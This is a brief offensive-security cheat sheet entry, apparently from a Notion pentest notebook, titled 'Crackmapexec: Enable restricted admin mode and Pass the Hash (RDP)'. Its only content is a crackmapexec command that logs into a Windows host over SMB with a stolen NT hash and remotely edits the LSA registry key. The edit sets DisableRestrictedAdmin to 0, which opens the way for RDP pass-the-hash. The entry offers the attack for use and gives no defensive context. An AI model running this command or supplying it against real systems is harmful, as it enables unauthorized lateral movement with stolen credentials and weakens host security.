# Crackmapexec: Enable restricted admin mode and Pass the Hash (RDP)

OS: Active_Directory, Windows
Description: Crackmapexec: Enable restricted admin mode and Pass the Hash (RDP)
Security Domains: Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

```jsx
crackmapexec smb 192.168.0.1 -u "username" -H "NT_HASH" -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```